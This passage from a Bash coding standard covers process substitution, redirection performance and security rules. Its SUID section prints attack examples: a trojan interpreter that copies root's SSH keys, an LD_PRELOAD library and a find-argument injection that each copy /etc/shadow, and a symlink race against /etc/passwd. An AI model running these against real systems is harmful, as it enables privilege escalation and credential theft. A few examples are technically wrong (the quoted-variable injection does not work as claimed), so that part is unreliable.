if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
  info "Processing non-empty readable file ${file@Q}"
  process_file "$file"
fi

# Multiple conditions with OR
if [[ -f "$config1" ]]; then
  config_file=$config1
elif [[ -f "$config2" ]]; then
  config_file=$config2
else
  die 3 'No configuration file found'
fi

# Complex validation
validate_executable() {
  local script=$1

  [[ -e "$script" ]] || die 2 "File does not exist ${script@Q}"
  [[ -f "$script" ]] || die 22 "Not a regular file ${script@Q}"
  [[ -x "$script" ]] || die 126 "Not executable ${script@Q}"
  [[ -s "$script" ]] || die 22 "File is empty ${script@Q}"
}
```



---


**Rule: BCS0902**

## Wildcard Expansion
Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with `-`.

```bash
# ✓ Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

# ✗ Incorrect - filenames starting with - become flags
rm -v *
```



---


**Rule: BCS0903**

## Process Substitution

**Use process substitution `<(command)` and `>(command)` to provide command output as file-like inputs or to send data to commands as if writing to files. Process substitution eliminates the need for temporary files, avoids subshell issues with pipes, and enables powerful command composition patterns.**

**Rationale:**

- **No Temporary Files**: Eliminates need for creating, managing, and cleaning up temp files
- **Avoid Subshells**: Unlike pipes to while, process substitution preserves variable scope
- **Multiple Inputs**: Commands can read from multiple process substitutions simultaneously
- **Parallelism**: Multiple process substitutions run in parallel
- **Clean Syntax**: More readable than complex piping and temp file management
- **Resource Efficiency**: Data streams through FIFOs/file descriptors without disk I/O

**How process substitution works:**

Process substitution creates a temporary FIFO (named pipe) or file descriptor that connects command output to another command's input.

```bash
# >(command) - Output redirection
# Creates: /dev/fd/63 (or similar)
# Data written to this goes to command's stdin

# <(command) - Input redirection
# Creates: /dev/fd/63 (or similar)
# Data read from this comes from command's stdout

# Example visualization:
diff <(sort file1) <(sort file2)

# Bash expands to something like:
# diff /dev/fd/63 /dev/fd/64
# Where:
#   /dev/fd/63 contains output of: sort file1
#   /dev/fd/64 contains output of: sort file2
```

**Basic patterns:**

**1. Input process substitution `<(command)`:**

```bash
# Compare command outputs
diff <(ls dir1) <(ls dir2)

# Use command output as file
cat <(echo "Header") <(cat data.txt) <(echo "Footer")

# Feed command output to another command
grep pattern <(find /data -name '*.log')

# Multiple inputs
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)
```

**2. Output process substitution `>(command)`:**

```bash
# Tee output to multiple commands
command | tee >(wc -l) >(grep ERROR) > output.txt

# Split output to different processes
generate_data | tee >(process_type1) >(process_type2) > /dev/null

# Send to command as if writing file
echo "data" > >(base64)
```

**Common use cases:**

**1. Comparing command outputs:**

```bash
# Compare sorted directory listings
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)

# Compare file checksums
diff <(sha256sum /backup/file) <(sha256sum /original/file)

# Compare configuration
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading command output into array:**

```bash
# ✓ BEST - readarray with process substitution
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# Array is populated correctly
echo "Users: ${#users[@]}"

# ✓ ALSO GOOD - null-delimited
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Avoiding subshell in while loops:**

```bash
# ✓ CORRECT - Process substitution (no subshell)
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(cat file.txt)

echo "Count: $count"  # Correct value!

# Compare with pipe (wrong - creates subshell):
# cat file.txt | while read -r line; do ...
```

**4. Multiple simultaneous inputs:**

```bash
# Read from multiple sources
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: ${line1@Q}"
  echo "File2: ${line2@Q}"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

# Merge sorted files
sort -m <(sort file1) <(sort file2) <(sort file3)
```

**5. Parallel processing with tee:**

```bash
# Process log file multiple ways simultaneously
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete examples:**

**Example 1: Configuration comparison:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Compare configs on multiple servers
compare_configs() {
  local -a servers=("$@")
  local -- config_file=/etc/myapp/config.conf

  if [[ ${#servers[@]} -lt 2 ]]; then
    error 'Need at least 2 servers to compare'
    return 22
  fi

  info "Comparing $config_file across ${#servers[@]} servers"

  # Compare first two servers
  local -- server1="${servers[0]}"
  local -- server2="${servers[1]}"

  diff \
    <(ssh "$server1" "cat $config_file 2>/dev/null || echo 'NOT FOUND'") \
    <(ssh "$server2" "cat $config_file 2>/dev/null || echo 'NOT FOUND'")

  local -i diff_exit=$?

  if ((diff_exit == 0)); then
    success "Configs are identical on $server1 and $server2"
  else
    warn "Configs differ between $server1 and $server2"
  fi

  return "$diff_exit"
}

main() {
  compare_configs 'server1.example.com' 'server2.example.com'
}

main "$@"

#fin
```

**Example 2: Log analysis with parallel processing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Analyze log file in parallel
analyze_log() {
  local -- log_file=$1
  local -- output_dir=${2:-.}

  info "Analyzing ${log_file@Q}..."

  # Process log file multiple ways simultaneously
  cat "$log_file" | tee \
    >(grep 'ERROR' | sort -u > "$output_dir"/errors.txt) \
    >(grep 'WARN' | sort -u > "$output_dir"/warnings.txt) \
    >(awk '{print $1}' | sort -u > "$output_dir"/unique_timestamps.txt) \
    >(wc -l > "$output_dir"/line_count.txt) \
    > "$output_dir"/full_log.txt

  # Wait for all background processes
  wait

  # Report results
  local -i error_count warn_count total_lines

  error_count=$(wc -l < "$output_dir"/errors.txt)
  warn_count=$(wc -l < "$output_dir"/warnings.txt)
  total_lines=$(cat "$output_dir"/line_count.txt)

  info "Analysis complete:"
  info "  Total lines: $total_lines"
  info "  Unique errors: $error_count"
  info "  Unique warnings: $warn_count"
}

main() {
  local -- log_file=${1:-/var/log/app.log}
  analyze_log "$log_file"
}

main "$@"
#fin
```

**Example 3: Data merging with process substitution:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Merge and compare data from multiple sources
merge_user_data() {
  local -- source1=$1
  local -- source2=$2

  # Read users from multiple sources simultaneously
  local -a users1 users2

  readarray -t users1 < <(cut -d: -f1 "$source1" | sort -u)
  readarray -t users2 < <(cut -d: -f1 "$source2" | sort -u)

  info "Source 1: ${#users1[@]} users"
  info "Source 2: ${#users2[@]} users"

  # Find users in both
  local -a common
  readarray -t common < <(comm -12 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source1
  local -a only_source1
  readarray -t only_source1 < <(comm -23 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source2
  local -a only_source2
  readarray -t only_source2 < <(comm -13 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Report
  info "Common users: ${#common[@]}"
  info "Only in source 1: ${#only_source1[@]}"
  info "Only in source 2: ${#only_source2[@]}"
}

main() {
  merge_user_data '/etc/passwd' '/backup/passwd'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using temp files instead
temp1=$(mktemp)
temp2=$(mktemp)
sort file1 > "$temp1"
sort file2 > "$temp2"
diff "$temp1" "$temp2"
rm "$temp1" "$temp2"

# ✓ Correct - process substitution (no temp files)
diff <(sort file1) <(sort file2)

# ✗ Wrong - pipe to while (subshell issue)
declare -i count=0
cat file | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution (no subshell)
declare -i count=0
while read -r line; do
  count+=1
done < <(cat file)
echo "$count"  # Correct value!

# ✗ Wrong - sequential processing
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt
# Reads file 3 times!

# ✓ Correct - parallel with tee and process substitution
cat log | tee \
  >(grep ERROR > errors.txt) \
  >(grep WARN > warnings.txt) \
  >(wc -l > count.txt) \
  > /dev/null
# Reads file once, processes in parallel

# ✗ Wrong - not quoting process substitution
diff <(sort $file1) <(sort $file2)  # Word splitting!

# ✓ Correct - quote variables
diff <(sort "$file1") <(sort "$file2")

# ✗ Wrong - forgetting error handling
diff <(failing_command) file
# If failing_command fails, diff gets empty input

# ✓ Correct - check command success
if temp_output=$(failing_command); then
  diff <(echo "$temp_output") file
else
  die 1 'Command failed'
fi
```

**Edge cases and advanced patterns:**

**1. File descriptor assignment:**

```bash
# Assign process substitution to file descriptor
exec 3< <(long_running_command)

# Read from it later
while IFS= read -r line <&3; do
  echo "$line"
done

# Close when done
exec 3<&-
```

**2. Multiple outputs with tee:**

```bash
# Send different data to different commands
{
  echo "type1: data1"
  echo "type2: data2"
  echo "type1: data3"
} | tee \
  >(grep 'type1' > type1.log) \
  >(grep 'type2' > type2.log) \
  > all.log
```

**3. Combining with here-strings:**

```bash
# Pass variable through process
var="hello world"
result=$(tr '[:lower:]' '[:upper:]' < <(echo "$var"))
echo "$result"  # HELLO WORLD

# Or with here-string (simpler for variables)
result=$(tr '[:lower:]' '[:upper:]' <<< "$var")
```

**4. Process substitution with diff:**

```bash
# Compare sorted JSON
diff \
  <(jq -S . file1.json) \
  <(jq -S . file2.json)

# Compare command output against expected
diff \
  <(my_command --output) \
  <(echo "expected output")
```

**5. NULL-delimited with process substitution:**

```bash
# Handle filenames with spaces/newlines
while IFS= read -r -d '' file; do
  echo "Processing ${file@Q}"
done < <(find /data -type f -print0)

# With readarray
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**6. Nested process substitution:**

```bash
# Complex data processing
diff \
  <(sort <(grep pattern file1)) \
  <(sort <(grep pattern file2))

# Process chains
cat <(echo "header") <(sort <(grep -v '^#' data.txt)) <(echo "footer")
```

**Testing process substitution:**

```bash
# Test that process substitution works
test_process_substitution() {
  # Should create file-like object
  local -- test_file
  test_file=$(echo <(echo "test"))

  if [[ -e "$test_file" ]]; then
    info "Process substitution creates ${test_file@Q}"
  else
    error 'Process substitution not working'
    return 1
  fi

  # Test reading
  local -- content
  content=$(cat <(echo "hello"))

  if [[ "$content" == hello ]]; then
    info 'Process substitution read test: PASS'
  else
    error "Expected 'hello', got ${content@Q}"
    return 1
  fi
}

# Test avoiding subshell
test_subshell_avoidance() {
  local -i count=0

  while read -r line; do
    ((count+=1))
  done < <(echo -e "a\nb\nc")

  if ((count == 3)); then
    info "Subshell avoidance test: PASS (count=$count)"
  else
    error "Expected count=3, got count=$count"
    return 1
  fi
}

test_process_substitution
test_subshell_avoidance
```

**When NOT to use process substitution:**

```bash
# Simple command output - command substitution is clearer
# ✗ Overcomplicated
result=$(cat <(command))

# ✓ Simpler
result=$(command)

# Single file input - direct redirection is clearer
# ✗ Overcomplicated
grep pattern < <(cat file)

# ✓ Simpler
grep pattern < file
# Or:
grep pattern file

# Variable expansion - use here-string
# ✗ Overcomplicated
command < <(echo "$variable")

# ✓ Simpler
command <<< "$variable"
```

**Summary:**

- **Use `<(command)` for input** - treats command output as readable file
- **Use `>(command)` for output** - treats command as writable file
- **Eliminates temp files** - data streams through FIFOs/file descriptors
- **Avoids subshells** - unlike pipes, preserves variable scope
- **Enables parallelism** - multiple substitutions run simultaneously
- **Multiple inputs** - commands can read from several process substitutions
- **Works with diff, comm, paste** - any command accepting file arguments
- **Quote variables** - inside process substitution, quote like normal
- **Combine with tee** - for parallel output processing

**Key principle:** Process substitution is Bash's answer to "I need this command's output to look like a file." It's more efficient than temp files, safer than pipes (no subshell), and enables powerful data processing patterns. When you find yourself creating temp files just to pass data between commands, process substitution is almost always the better solution.


---


**Rule: BCS0904**

## 
Here Documents
Use for multi-line strings or input.

```bash
# No variable expansion (note single quotes)
cat <<'EOT'
This is a multi-line
string with no variable
expansion.
EOT

# With variable expansion
cat <<EOT
User: $USER
Home: $HOME
EOT
```


---


**Rule: BCS0905**

## Input Redirection vs Cat: Performance Optimization

## Summary

Replace `cat filename` with `< filename` redirection in performance-critical contexts to eliminate process fork overhead. This optimization provides 3-100x speedup depending on usage pattern.

## Performance Comparison

### Benchmark Results (1000 iterations)

| Test Scenario | Method | Real Time | Speedup |
|---------------|--------|-----------|---------|
| **Small file output** | | | |
| Output to /dev/null | `cat file` | 0.792s | baseline |
| | `< file` | 0.234s | **3.4x faster** |
| **Command substitution** | | | |
| Read into variable | `$(cat file)` | 0.965s | baseline |
| | `$(< file)` | 0.009s | **107x faster** |
| **Larger file (500 iterations)** | | | |
| Output to /dev/null | `cat file` | 0.398s | baseline |
| | `< file` | 0.115s | **3.5x faster** |

### Why the Difference?

**External `cat` overhead:**
1. Fork a new process
2. Exec the /usr/bin/cat binary
3. Load executable into memory
4. Set up new process environment
5. Open file, read, write to stdout
6. Wait for process to exit
7. Clean up process resources

**Bash redirection `< file`:**
1. Open file descriptor (already in shell)
2. Read and output directly
3. Close file descriptor

**Command substitution `$(< file)`:**
- Bash reads file directly into variable
- Zero external processes
- Builtin-like behavior

## When to Use `< filename`

### 1. Command Substitution (CRITICAL - 107x speedup)

```bash
# RECOMMENDED - Massively faster
content=$(< file.txt)
lines=$(< data.json)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
lines=$(cat data.json)
config=$(cat /etc/app.conf)
```

**Rationale:** Bash reads the file directly with zero external processes.

### 2. Single Input to Command (3-4x speedup)

```bash
# RECOMMENDED
grep "pattern" < file.txt
while read line; do ...; done < file.txt
awk '{print $1}' < data.csv
sort < unsorted.txt
jq '.field' < data.json

# AVOID - Wastes a cat process
cat file.txt | grep "pattern"
cat file.txt | while read line; do ...; done
cat data.csv | awk '{print $1}'
cat unsorted.txt | sort
cat data.json | jq '.field'
```

**Rationale:** Eliminates the `cat` process entirely. Shell opens file, command reads stdin.

### 3. Loop Optimization (Massive cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    process "$data"
done

declare -i errors=0
for logfile in /var/log/app/*.log; do
    errors=$(grep -c ERROR < "$logfile")
    if ((errors)); then
        alert=$(< "$logfile")
        send_alert "$alert"
    fi
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
    process "$data"
done

declare -i errors=0
for logfile in /var/log/app/*.log; do
    errors=$(cat "$logfile" | grep -c ERROR)
    if ((errors)); then
        alert=$(cat "$logfile")
        send_alert "$alert"
    fi
done
```

**Rationale:** In loops, fork overhead multiplies. 1000 iterations = 1000 avoided process creations.

### 4. Conditional File Reading

```bash
# RECOMMENDED
if grep -q 'ERROR' < /var/log/app.log; then
    alert=$(< /var/log/app.log)
    notify "$alert"
fi

# AVOID
if cat /var/log/app.log | grep -q 'ERROR'; then
    alert=$(cat /var/log/app.log)
    notify "$alert"
fi
```

## When NOT to Use `< filename`

| Scenario | Why Not | Use Instead |
|----------|---------|-------------|
| Multiple files | `< file1 file2` is invalid syntax | `cat file1 file2` |
| Need cat options | No `-n`, `-A`, `-E`, `-b`, `-s` support | `cat -n file` |
| Direct output | `< file` alone produces no output | `cat file` |
| Concatenation | Cannot combine multiple sources | `cat file1 file2 file3` |
| POSIX portability | Older shells may not optimize this | `cat file` |

### Example: Invalid Usage

```bash
# WRONG - Does nothing visible
< /tmp/test.txt
# Output: (nothing - redirection without command)

# WRONG - Invalid syntax
< file1.txt file2.txt
# Error: permission denied on file2.txt

# RIGHT - Must use cat
cat file1.txt file2.txt
```

## Technical Details

### Why `< filename` Alone Does Nothing

```bash
# This opens the file on stdin but has no command to consume it
< /tmp/test.txt
# Shell: Opens file descriptor, no command to read it, closes file descriptor

# These work because there's a command to consume stdin
cat < /tmp/test.txt    # cat reads from stdin
< /tmp/test.txt cat    # Same, different order
```

The `<` operator is a **redirection operator**, not a **command**. It only opens a file on stdin; you still need a command to consume that input.

### Why Alias Doesn't Work

```bash
# This doesn't work
alias cat='< '
cat /tmp/file.txt
# Expands to: < /tmp/file.txt
# Result: No output (no command to consume the redirected input)
```

Bash has no built-in command to output file contents. You must use an external command like `cat`, `dd`, or a loop.

### The One Exception: Command Substitution

```bash
# This is the magic case
content=$(< file.txt)
```

In command substitution context, bash itself reads the file and captures it as the substitution result. This is the only case where `< filename` works standalone (within `$()`).

## Performance Model

```
Fork overhead dominant:    Small files in loops    → 100x+ speedup
I/O with fork overhead:    Large files, single use → 3-4x speedup
Zero fork:                 Command substitution    → 100x+ speedup
```

### Why Speedup is Consistent Across File Sizes

The benchmarks show:
- Small file (1 line): 3.4x speedup
- Large file (1000 lines): 3.5x speedup

**Explanation:** Process creation overhead (fork/exec) dominates I/O time even for larger files. The time to fork, exec, and wait for cat is comparable to or greater than the actual I/O operation.

## Real-World Example

### Before Optimization

```bash
#!/bin/bash

# Process all log files
declare -i errors=0
for logfile in /var/log/app/*.log; do
    # Read entire file
    content=$(cat "$logfile")

    # Count errors
    errors=$(cat "$logfile" | grep -c ERROR)

    # Extract warnings
    warnings=$(cat "$logfile" | grep WARNING)

    # Process if errors found
    if ((errors)); then
        cat "$logfile" error.log > combined.log
    fi
done
```

**Problems:**
- 4 cat processes per iteration
- 100 log files = 400 process forks
- Massive overhead in tight loop

### After Optimization

```bash
#!/bin/bash

# Process all log files
declare -i errors=0
for logfile in /var/log/app/*.log; do
    # Read entire file - 100x faster
    content=$(< "$logfile")

    # Count errors - no cat needed
    errors=$(grep -c ERROR < "$logfile")

    # Extract warnings - no cat needed
    warnings=$(grep WARNING < "$logfile")

    # Process if errors found
    if ((errors)); then
        # Multiple files - must use cat
        cat "$logfile" error.log > combined.log
    fi
done
```

**Improvements:**
- 3 process forks eliminated per iteration
- 100 log files = 300 fewer process forks
- Only 1 cat call when actually needed (concatenation)
- 10-100x faster depending on file sizes

## Recommendation

**SHOULD:** Use `< filename` in all performance-critical code for:
- Command substitution: `var=$(< file)`
- Single file input to commands: `cmd < file`
- Loops with many file reads

**MAY:** Use `cat` when:
- Concatenating multiple files
- Need cat-specific options
- Code clarity is more important than performance
- POSIX portability to very old shells is required

**MUST:** Use `cat` when:
- Multiple file arguments needed
- Using options like `-n`, `-b`, `-E`, `-T`, `-s`, `-v`

## Impact Assessment

**Performance Gain:**
- Tight loops with command substitution: 10-100x faster
- Single command pipelines: 3-4x faster
- Large scripts with many file reads: 5-50x overall speedup

**Compatibility:**
- Works in bash 3.0+, zsh, ksh
- May not be optimized in very old shells (sh, dash)
- Test in target environment

**Code Clarity:**
- `$(< file)` is bash idiom, well understood
- `cmd < file` is clearer than `cat file | cmd`
- No negative impact on readability

## Testing

```bash
# Test command substitution speedup
echo "Test content" > /tmp/test.txt

time for i in {1..1000}; do content=$(cat /tmp/test.txt); done
# Expected: ~0.8-1.0s

time for i in {1..1000}; do content=$(< /tmp/test.txt); done
# Expected: ~0.01s (100x faster)

# Test pipeline speedup
seq 1 1000 > /tmp/numbers.txt

time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done
# Expected: ~0.4s

time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done
# Expected: ~0.1s (4x faster)
```

## See Also

- BCS rule on process efficiency
- BCS rule on avoiding useless use of cat (UUOC)
- Bash manual: Redirections
- ShellCheck SC2002 (useless cat)

## References

- GNU Bash manual: Redirections
- Performance analysis conducted 2025-10-17
- Test platform: Linux 6.8.0-85-generic
- Bash version: 5.2+


---


**Rule: BCS1000**

# Security Considerations

This critical section establishes security-first practices for production bash scripts, covering five essential areas. It mandates never using SUID/SGID permissions on bash scripts due to inherent security risks, requires locking down PATH or explicitly validating it to prevent command hijacking, explains IFS (Internal Field Separator) safety to avoid word-splitting vulnerabilities, strongly discourages `eval` usage due to injection risks (requiring explicit justification when unavoidable), and details input sanitization patterns for validating and cleaning user input early. These practices prevent privilege escalation, command injection, path traversal, and other common attack vectors in shell scripts.


---


**Rule: BCS1001**

## SUID/SGID

**Never use SUID (Set User ID) or SGID (Set Group ID) bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
# ✗ NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

# ✓ Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

# ✓ Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker can set `IFS` to control word splitting, causing commands to execute with elevated privileges
- **PATH Manipulation**: Even if you set `PATH` in the script, the kernel uses the caller's `PATH` to find the interpreter, allowing trojan attacks
- **Library Injection**: `LD_PRELOAD` and `LD_LIBRARY_PATH` can inject malicious code before script execution
- **Shell Expansion**: Bash performs multiple expansions (brace, tilde, parameter, command substitution, glob) that can be exploited
- **Race Conditions**: TOCTOU (Time Of Check, Time Of Use) vulnerabilities in file operations
- **Interpreter Vulnerabilities**: Bugs in bash itself can be exploited when running with elevated privileges
- **No Compilation**: Unlike compiled programs, script source is readable and modifiable, increasing attack surface

**Why SUID/SGID bits are dangerous on shell scripts:**

SUID/SGID bits change the effective user/group ID to the file owner's UID/GID during execution. For compiled binaries, the kernel loads and executes machine code directly. For shell scripts, the kernel:

1. Reads the shebang (`#!/bin/bash`)
2. Executes the interpreter (`/bin/bash`) with the script as argument
3. The interpreter inherits SUID/SGID privileges
4. The interpreter then processes the script, performing expansions and executing commands

This multi-step process creates numerous attack vectors that don't exist for compiled programs.

**Specific attack examples:**

**1. IFS Exploitation:**

```bash
# Vulnerable SUID script (owned by root)
#!/bin/bash
# /usr/local/bin/vulnerable.sh (SUID root)
set -euo pipefail

# Intended: Check if service is running
service_name=$1
status=$(systemctl status "$service_name")
echo "$status"
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable.sh "../../etc/shadow"

# With IFS='/', the path is split into words
# systemctl status "../../etc/shadow" might be interpreted as:
# systemctl status ".." ".." "etc" "shadow"
# Depending on systemctl's argument parsing, this could expose sensitive files
```

**2. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH

tar -czf /backup/data.tar.gz /var/data
```

**Attack:**
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOT'
#!/bin/bash
# Copy root's SSH keys
cp -r /root/.ssh /tmp/stolen_keys
# Now execute the real script
exec /bin/bash "$@"
EOT
chmod +x /tmp/evil/bash

# Attacker manipulates PATH before executing SUID script
export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh

# The kernel uses the caller's PATH to find the interpreter!
# It executes /tmp/evil/bash with SUID privileges
# Attacker's code runs as root BEFORE the script's PATH is set
```

**3. Library Injection Attack:**

```bash
# SUID script: /usr/local/bin/report.sh
#!/bin/bash
set -euo pipefail

# Generate system report
echo "System Report" > /root/report.txt
df -h >> /root/report.txt
```

**Attack:**
```bash
# Attacker creates malicious shared library
cat > /tmp/evil.c << 'EOT'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    // Runs before main() / script execution
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
        system("chmod 644 /tmp/shadow_copy");
    }
}
EOT

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Execute SUID script with malicious library preloaded
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh

# The malicious library runs with root privileges before the script
```

**4. Command Injection via Unquoted Variables:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/cleaner.sh (SUID root)

directory=$1
# Intended to clean old files
find "$directory" -type f -mtime +30 -delete
```

**Attack:**
```bash
# Attacker injects commands through directory name
/usr/local/bin/cleaner.sh "/tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \;"

# The injected find command becomes:
# find /tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \; -type f -mtime +30 -delete
# This bypasses the intended logic and exfiltrates /etc/shadow
```

**5. Symlink Race Condition:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/secure_write.sh (SUID root)
set -euo pipefail

output_file=$1

# Check if file is safe to write
if [[ -f "$output_file" ]]; then
  die 1 "File ${output_file@Q} already exists'
fi

# Race condition window here!
# Write sensitive data
echo "secret data" > "$output_file"
```

**Attack:**
```bash
# Terminal 1: Run script repeatedly
while true; do
  /usr/local/bin/secure_write.sh /tmp/output 2>/dev/null && break
done

# Terminal 2: Create symlink in the race window
while true; do
  rm -f /tmp/output
  ln -s /etc/passwd /tmp/output
done

# If timing is right, the script writes to /etc/passwd!
```

**Safe alternatives to SUID/SGID scripts:**

**1. Use sudo with configured permissions:**

```bash
# /etc/sudoers.d/myapp
# Allow specific user to run specific script as root
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh

# Allow group to run script with specific arguments
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities instead of full SUID:**

```bash
# For compiled programs (not scripts), use capabilities
# Grant only specific privileges needed
setcap cap_net_bind_service=+ep /usr/local/bin/myserver

# This allows binding to ports < 1024 without full root
```

**3. Use a setuid wrapper (compiled C program):**

```c
# Wrapper validates input, then executes script as root
# /usr/local/bin/backup_wrapper.c (compiled and SUID)
int main(int argc, char *argv[]) {
    // Validate arguments
    if (argc != 2) return 1;

    // Sanitize PATH
    setenv("PATH", "/usr/bin:/bin", 1);

    // Clear dangerous environment variables
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");

    // Execute script with validated environment
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use PolicyKit (pkexec) for GUI applications:**

```bash
# Define policy action in /usr/share/polkit-1/actions/
# Use pkexec to execute with elevated privileges
pkexec /usr/local/bin/system-config.sh
```

**5. Use systemd service with elevated privileges:**

```
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application Service

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
RemainAfterExit=no

# User triggers via systemctl (requires appropriate PolicyKit policy)
systemctl start myapp.service
```

**Detection and prevention:**

**Find SUID/SGID shell scripts on your system:**
```bash
# Search for SUID/SGID scripts (should return nothing!)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# List all SUID files (review carefully)
find / -type f -perm -4000 -ls 2>/dev/null

# List all SGID files
find / -type f -perm -2000 -ls 2>/dev/null
```

**Prevent accidental SUID on scripts:**
```bash
# Modern Linux kernels ignore SUID on scripts, but don't rely on this
# Many Unix variants still honor SUID on scripts

# In your deployment scripts, explicitly ensure no SUID:
install -m 755 myscript.sh /usr/local/bin/
# Never use -m 4755 or chmod u+s on shell scripts
```

**Why sudo is safer:**

```bash
# ✓ Sudo provides multiple safety features:
# 1. Logging: All sudo commands are logged to /var/log/auth.log
# 2. Timeout: Credentials expire after 15 minutes
# 3. Granular control: Specific commands, arguments, users
# 4. Environment sanitization: Clears dangerous variables by default
# 5. Audit trail: Who ran what, when

# Configure specific commands in /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/backup.sh
username ALL=(root) /usr/local/bin/restore.sh *

# User runs:
sudo /usr/local/bin/backup.sh
# Logged: "username : TTY=pts/0 ; PWD=/home/username ; USER=root ; COMMAND=/usr/local/bin/backup.sh"
```

**Real-world security incident example:**

In the early 2000s, many Unix systems had SUID root shell scripts for system administration tasks. Attackers exploited these through:
- IFS manipulation to execute arbitrary commands
- PATH attacks to substitute malicious interpreters
- Race conditions in temporary file handling
- Command injection through unchecked user input

Modern Linux distributions (since ~2005) ignore SUID bits on scripts by default, but:
- Many Unix variants still honor them
- Legacy systems may be vulnerable
- Scripts deployed to unknown systems may be exploited
- The practice itself is fundamentally unsafe

**Summary:**

- **Never** use SUID or SGID on shell scripts under any circumstances
- Shell scripts have too many attack vectors to be safe with elevated privileges
- Use `sudo` with carefully configured permissions instead
- For compiled programs needing specific privileges, use capabilities
- Use setuid wrappers (compiled C) if you absolutely must execute a script with privileges
- Audit your systems regularly for SUID/SGID scripts: `find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \;`
- Remember: Convenience is never worth the security risk of SUID shell scripts

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign your solution using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1002**

## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection. An insecure PATH is one of the most common attack vectors in shell scripts.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements in PATH cause commands to execute from the current directory
- **Privilege Escalation**: Scripts running with elevated privileges can be tricked into executing attacker code
- **Search Order Matters**: Earlier directories in PATH are searched first, allowing priority-based attacks
- **Environment Inheritance**: PATH is inherited from the caller's environment, which may be malicious
- **Defense in Depth**: Securing PATH is a critical layer of defense even when other precautions are taken

